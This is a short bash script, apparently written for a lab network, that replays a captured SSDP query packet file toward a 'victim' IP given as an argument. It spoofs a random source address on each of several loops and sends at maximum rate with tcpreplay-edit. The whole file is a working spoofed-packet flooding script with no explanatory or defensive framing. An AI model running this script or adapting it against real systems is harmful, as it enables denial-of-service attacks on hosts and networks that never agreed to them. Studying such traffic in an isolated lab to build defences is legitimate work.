#!/bin/bash

VICTIM="$1" # Victim IP address
LOOPS="$2"

tcpprep -c 10.0.1.24 -o ssdp.cach -i ssdp-querry-short.pcap

while [ $LOOPS -gt 0 ]
do
    IP=$(echo $((RANDOM%254 + 1)))
    tcpreplay-edit --endpoints="192.168.122.$IP":"$VICTIM" \
        --enet-smac=52:54:00:a9:3f:df,52:54:00:2d:4c:c4 \
        --enet-dmac=52:54:00:2d:4c:c4,52:54:00:a9:3f:df \
        -t -K -i eth0 -I eth0 \
        -c ssdp.cach ssdp-querry-short.pcap

    LOOPS=$(( $LOOPS - 1 ))
done
